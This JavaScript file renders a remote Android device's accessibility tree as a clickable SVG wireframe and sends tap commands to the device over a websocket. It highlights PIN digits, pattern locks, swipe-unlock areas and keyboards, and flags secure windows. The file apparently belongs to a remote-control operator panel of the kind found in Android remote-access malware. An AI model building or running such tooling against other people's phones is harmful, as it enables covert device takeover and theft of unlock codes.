/**
 * ly-reader.js — Alpha Ly accessibility tree renderer.
 *
 * Renders the device accessibility tree as a flat SVG wireframe.
 * Colour codes by node type. Click any node → TAP command to that node's centre.
 * Shows FLAG_SECURE badge, keyboard highlight, PIN/pattern detection.
 */
'use strict';

class AlphaLy {

  static COLORS = {
    default:     '#00e5ff22',
    border:      '#00e5ff',
    text:        '#00e5ff',
    editable:    '#ff9100',
    keyboard:    '#00ff9d',
    keyboardKey: '#00ff9d55',
    pinDigit:    '#ff4081',
    pattern:     '#ea00ff',
    swipe:       '#ffe000',
    focused:     '#fff',
    secure:      '#ff1e3c',
  };

  constructor(svgEl, ws, devId) {
    this.svg    = svgEl;
    this.ws     = ws;
    this.devId  = devId;
    this.active = false;

    this._pollTimer  = null;
    this._secureFlag = false;
    this._lastHash   = '';
    this._deviceW    = 1;
    this._deviceH    = 1;
  }

  // ── Start/stop polling ────────────────────────────────────────────────────────

  start(intervalMs = 700) {
    this.active = true;
    this.ws.send({ type: 'hierarchy_subscribe', devId: this.devId, interval: intervalMs });
  }

  stop() {
    this.active = false;
    this.ws.send({ type: 'hierarchy_unsubscribe', devId: this.devId });
    this._clear();
  }

  // ── Hierarchy receiver (called by dash.js) ────────────────────────────────────

  onHierarchy({ id, data }) {
    if (id !== this.devId || !this.active) return;
    let root;
    try { root = typeof data === 'string' ? JSON.parse(data) : data; }
    catch { return; }

    // Skip re-render if nothing changed (simple hash)
    const hash = data.substring ? data.substring(0, 200) : JSON.stringify(root).substring(0, 200);
    if (hash === this._lastHash) return;
    this._lastHash = hash;

    this._deviceW    = root.w    || 1080;
    this._deviceH    = root.h    || 1920;
    this._secureFlag = root.secure || false;

    this._render(root);
  }

  onSecureWindow(secure) {
    this._secureFlag = secure;
  }

  // ── Render ────────────────────────────────────────────────────────────────────

  _render(root) {
    const svgW = this.svg.clientWidth  || 360;
    const svgH = this.svg.clientHeight || 640;

    const scaleX = svgW / this._deviceW;
    const scaleY = svgH / this._deviceH;

    this.svg.setAttribute('viewBox', `0 0 ${svgW} ${svgH}`);
    this._clear();

    if (this._secureFlag) {
      this._appendSecureBadge(svgW);
    }

    this._walkNodes(root.children || [], scaleX, scaleY);
  }

  _walkNodes(nodes, sx, sy) {
    for (const node of nodes) {
      this._renderNode(node, sx, sy);
      if (node.children) this._walkNodes(node.children, sx, sy);
    }
  }

  _renderNode(node, sx, sy) {
    const b = node.bounds;
    if (!b || b.w <= 0 || b.h <= 0) return;

    const x = b.x * sx, y = b.y * sy;
    const w = b.w * sx, h = b.h * sy;

    // Pick colour
    let fill   = AlphaLy.COLORS.default;
    let stroke = AlphaLy.COLORS.border;

    if (node.isPatternLock) stroke = fill = AlphaLy.COLORS.pattern;
    else if (node.isPinDigit)   stroke = fill = AlphaLy.COLORS.pinDigit;
    else if (node.isKeyboardKey) { stroke = AlphaLy.COLORS.keyboard; fill = AlphaLy.COLORS.keyboardKey; }
    else if (node.isKeyboard)   stroke = AlphaLy.COLORS.keyboard;
    else if (node.isSwipeUnlock) stroke = fill = AlphaLy.COLORS.swipe;
    else if (node.editable)     stroke = AlphaLy.COLORS.editable;
    else if (node.focused)      stroke = AlphaLy.COLORS.focused;

    // Rectangle
    const rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
    rect.setAttribute('x',      x.toFixed(1));
    rect.setAttribute('y',      y.toFixed(1));
    rect.setAttribute('width',  w.toFixed(1));
    rect.setAttribute('height', h.toFixed(1));
    rect.setAttribute('fill',   fill);
    rect.setAttribute('stroke', stroke);
    rect.setAttribute('stroke-width', '1');
    rect.setAttribute('rx', '2');

    if (node.clickable || node.editable || node.scrollable) {
      rect.style.cursor = 'pointer';
      const nx = (b.x + b.w / 2) / this._deviceW;
      const ny = (b.y + b.h / 2) / this._deviceH;
      rect.addEventListener('click', (e) => {
        e.stopPropagation();
        this.ws.cmd(this.devId, 'TAP', { x: nx, y: ny });
        // Flash clicked node
        rect.setAttribute('fill', '#ffffff44');
        setTimeout(() => rect.setAttribute('fill', fill), 200);
      });
      rect.addEventListener('dblclick', (e) => {
        e.stopPropagation();
        this.ws.cmd(this.devId, 'DOUBLE_TAP', { x: nx, y: ny });
      });
    }

    this.svg.appendChild(rect);

    // Label
    const label = this._nodeLabel(node);
    if (label && w > 20 && h > 10) {
      const textEl = document.createElementNS('http://www.w3.org/2000/svg', 'text');
      textEl.setAttribute('x', (x + 3).toFixed(1));
      textEl.setAttribute('y', (y + Math.min(h - 3, 12)).toFixed(1));
      textEl.setAttribute('font-size', Math.min(10, h * 0.6).toFixed(1));
      textEl.setAttribute('fill', AlphaLy.COLORS.text);
      textEl.setAttribute('font-family', 'monospace');
      textEl.setAttribute('pointer-events', 'none');
      textEl.textContent = label.length > 24 ? label.substring(0, 22) + '…' : label;
      this.svg.appendChild(textEl);
    }
  }

  _nodeLabel(node) {
    if (node.text)  return node.text;
    if (node.desc)  return node.desc;
    if (node.hint)  return `[${node.hint}]`;
    if (node.class) {
      const cls = node.class;
      if (cls.length < 20) return cls;
      return cls.split('.').pop();
    }
    return '';
  }

  _appendSecureBadge(svgW) {
    const rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
    rect.setAttribute('x', '0'); rect.setAttribute('y', '0');
    rect.setAttribute('width', svgW); rect.setAttribute('height', '22');
    rect.setAttribute('fill', AlphaLy.COLORS.secure);
    this.svg.appendChild(rect);

    const txt = document.createElementNS('http://www.w3.org/2000/svg', 'text');
    txt.setAttribute('x', '8'); txt.setAttribute('y', '15');
    txt.setAttribute('fill', '#fff');
    txt.setAttribute('font-size', '12');
    txt.setAttribute('font-family', 'monospace');
    txt.setAttribute('font-weight', 'bold');
    txt.textContent = '⚠ SECURE FLAG — accessibility tree may be incomplete';
    this.svg.appendChild(txt);
  }

  _clear() {
    while (this.svg.firstChild) this.svg.removeChild(this.svg.firstChild);
  }
}

window.AlphaLy = AlphaLy;
